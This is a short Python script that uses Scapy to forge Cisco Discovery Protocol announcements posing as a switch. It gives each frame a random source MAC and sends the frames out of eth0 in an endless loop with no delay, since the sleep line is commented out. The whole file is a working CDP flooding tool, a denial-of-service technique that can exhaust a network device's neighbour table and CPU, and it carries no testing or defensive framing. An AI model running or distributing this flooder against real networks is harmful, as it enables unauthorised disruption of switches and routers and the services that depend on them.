from scapy.all import *
from scapy.contrib import cdp

#Generate a random unicast MAC address
def generate_unicast_mac():
    mac = RandMAC()._fix() 
    mac_bytes = bytes.fromhex(mac.replace(':', ''))
    mac_bytes = bytearray(mac_bytes)
    mac_bytes[0] &= 0xFE
    return ':'.join(format(x, '02x') for x in mac_bytes)


llc_snap = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP(OUI=0x00000c, code=0x2000)

while True:

    msrc = generate_unicast_mac()
    print(f"Using MAC: {msrc}")

    eth_frame = Ether(dst='01:00:0c:cc:cc:cc', src=msrc)  

    cdp_packet = (
        cdp.CDPv2_HDR(vers=2, ttl=180) /
        cdp.CDPMsgDeviceID(val="Switch") /
        cdp.CDPMsgAddr(naddr=1, addr=cdp.CDPAddrRecordIPv4(addr="192.168.1.1")) /
        cdp.CDPMsgPortID(iface="GigabitEthernet1/1") /
        cdp.CDPMsgCapabilities(cap=0x00000020) /
        cdp.CDPMsgSoftwareVersion(val="0.8.2")
    )
    full_packet = eth_frame / llc_snap / cdp_packet

    full_packet.show2()

    sendp(full_packet, iface="eth0", verbose=True)

    #time.sleep(0.1)

